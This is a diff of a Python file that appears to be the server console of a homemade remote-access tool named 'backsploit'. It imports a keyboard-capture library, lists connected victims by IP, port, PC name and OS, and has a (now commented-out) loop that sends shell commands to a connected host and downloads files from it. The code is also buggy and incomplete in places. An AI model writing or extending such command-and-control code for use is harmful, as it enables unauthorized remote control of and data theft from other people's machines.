@@ -1,14 +1,6 @@
 # imports and dependencies
-from pynput import keyboard
-import os
-import sys
-import socket
-import threading
-import subprocess
-import json
-import base64
-import requests
-import time
+from pynput import keyboard 
+import os, sys, socket, threading, subprocess, json, base64, requests, time
 from queue import Queue
 
 
@@ -69,6 +61,32 @@ def create_socket():
         print("Exiting...")
         sys.exit(0)
 
+def q_worker():
+    while True:
+        value = queue.get()
+        if value == 1:
+            create_socket()
+        elif value == 2:
+            while True:
+                time.sleep(0.5)
+                if len(address_list) > 0:
+                    print("type 'help' to view the available commands")
+                    break
+        # queue.all_tasks_done() #to check if all the tasks in a queue have been completed.
+        queue.task_done() #indicate that a task in the queue has been completed.
+        queue.task_done()
+        sys.exit(0)
+
+for i in range(2):
+    t = threading.Thread(target=q_worker)
+    t.start()
+queue.join()
+
+for each_thread in q_list:
+    queue.put(each_thread)
+queue.join()
+
+
 def menu():
     print("\n<"+"-"*8 + "Server Commands" + "-"*8+">\n")
     print('''[ + ] help\t\t\t --> To view this help menu
@@ -90,7 +108,7 @@ def menu():
     [ + ] help\t\t\t --> To exit from this program''')
     print("\n<"+"-"*13 + "END" + "-"*13+">\n")
 
-def main():
+def menu_worker():
     while True:
         cmd = input(print("backsploit:~ "))
         if cmd=="help":
@@ -107,9 +125,12 @@ def main():
 def targets():
     if len(connection_list) > 0:
         data=''
-        for index, conn in enumerate(connection_list):
+        for index, conn in enumerate(connection_list): #creading 2-d array like in C --> arr[index][0]
             data += str(index) + "\t" + str(address_list[index][0]) + "\t" + str(address_list[index][1]) + "\t" + str(address_list[index][2]) + "\t" + str(address_list[index][3]) + "\n"
-          
+        print("ID"+"\t\t"+"IP"+"\t\t"+"Port"+"\t\t"+"PC"+"\t\t"+"OS")
+        print(str(address_list[0][0])+"\t\t"+str(address_list[0][1])+"\t\t"+str(address_list[0][2])+"\t\t"+str(address_list[0][3]))
+    else:
+        print("No connections !!")
 
 def close():
     if len(address_list) == 0:
@@ -123,53 +144,26 @@ def close():
     del connection_list
     connection_list = []
 
-            
 
+# def main():
+#     while True:        
+#         if (conn_addr):
+#             print("[+] New Connection:", conn_addr)
+#             while True:
+#                 # cmd = input("backsploit:~ ")
+#                 cmd = input("cmd:~ ")
+#                 cmd_send(sock_fd, cmd)
+#                 # sock_fd.send(cmd.encode())#dont need this line as we are calling the send function
+#                 if cmd[:8] == 'download':
+#                     download(sock_fd)
+#                     continue
+#                 res = cmd_recv(sock_fd)
+#                 # res = sock_fd.recv(1024) #dont need this line as we are calling the recv function
+#                 print(res)
+#     sock_fd.close()
+#     s.close()
 
-def q_worker():
-    while True:
-        value = queue.get()
-        if value == 1:
-            create_socket()
-        elif value == 2:
-            while True:
-                time.sleep(0.5)
-                if len(address_list) > 0:
-                    choice()
-                    break
-        # queue.all_tasks_done() #to check if all the tasks in a queue have been completed.
-        queue.task_done() #indicate that a task in the queue has been completed.
-        queue.task_done()
-        sys.exit(0)
-
-for i in range(2):
-    t = threading.Thread(target=q_worker)
-    t.start()
-queue.join()
-
-for each_thread in q_list:
-    queue.put(each_thread)
-queue.join()
-
-def main():
-    while True:        
-        if (conn_addr):
-            print("[+] New Connection:", conn_addr)
-            while True:
-                # cmd = input("backsploit:~ ")
-                cmd = input("cmd:~ ")
-                cmd_send(sock_fd, cmd)
-                # sock_fd.send(cmd.encode())#dont need this line as we are calling the send function
-                if cmd[:8] == 'download':
-                    download(sock_fd)
-                    continue
-                res = cmd_recv(sock_fd)
-                # res = sock_fd.recv(1024) #dont need this line as we are calling the recv function
-                print(res)
-    sock_fd.close()
-    s.close()
-
-main()
+# main()
 
 """ 
 import socket,os,threading,sys
